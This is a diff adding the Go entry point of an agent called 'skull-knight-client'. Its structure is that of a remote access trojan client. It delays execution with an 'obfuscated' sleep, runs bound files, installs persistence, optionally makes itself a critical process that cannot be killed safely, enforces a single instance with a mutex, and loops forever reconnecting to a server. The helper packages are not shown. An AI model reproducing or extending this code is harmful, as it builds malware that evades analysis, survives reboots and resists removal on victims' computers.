@@ -1,0 +1,52 @@
+package main
+
+import (
+	"log"
+	"time"
+
+	"skull-knight-client/cmd/agent/config"
+	"skull-knight-client/cmd/agent/criticalproc"
+	"skull-knight-client/cmd/agent/mutex"
+	"skull-knight-client/cmd/agent/persistence"
+)
+
+func main() {
+	cfg := config.Load()
+
+	if cfg.SleepSeconds > 0 {
+		sleepObfuscated(cfg.SleepSeconds)
+	}
+
+	runBoundFiles()
+
+	if cfg.EnablePersistence {
+		if err := persistence.Setup(); err != nil {
+			log.Printf("Warning: Failed to setup persistence: %v", err)
+		}
+	}
+
+	if cfg.CriticalProcess {
+		criticalproc.Setup()
+	}
+
+	releaseMutex, ok, err := mutex.Acquire(cfg.Mutex)
+	if err != nil {
+		log.Printf("[mutex] failed to initialize mutex: %v", err)
+		log.Printf("[mutex] continuing without mutex protection")
+		releaseMutex = func() {}
+		ok = true
+	}
+	if !ok {
+		log.Printf("[mutex] another instance is already running; exiting")
+		return
+	}
+	defer releaseMutex()
+
+	for {
+		func() {
+			defer recoverAndLog("main", nil)
+			runClient(cfg)
+		}()
+		time.Sleep(2 * time.Second)
+	}
+}
